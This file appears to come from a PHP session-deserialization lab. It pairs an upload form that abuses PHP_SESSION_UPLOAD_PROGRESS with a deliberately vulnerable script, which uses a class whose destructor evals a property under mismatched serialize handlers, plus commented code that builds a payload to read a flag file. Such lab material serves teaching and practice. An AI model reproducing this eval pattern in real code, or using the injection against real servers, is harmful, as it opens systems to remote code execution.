<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>

<form action="http://10.12.200.166/unserialize-lab/05.php" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />
    <input type="file" name="file" />
    <input type="submit" />
</form>


</body>
</html>

<?php

//烦死了 配环境真烦人
ini_set('session.serialize_handler', 'php');
session_start();

class OowoO
{
    public $mdzz;

    function __construct()
    {
        $this->mdzz = 'phpinfo();';
    }

    function __destruct()
    {
        eval($this->mdzz);
    }
}

if (isset($_GET['phpinfo'])) {
    $m = new OowoO();
} else {
    highlight_string(file_get_contents('05.php'));
}


?>


<!--ini_set('session.serialize_handler', 'php_serialize');-->
<!--session_start();-->
<!---->
<!--class OowoO-->
<!--{-->
<!--public $mdzz = 'file_get_contents(./flag.php);';-->
<!--}-->
<!---->
<!--$obj = new OowoO();-->
<!--echo serialize($obj);-->
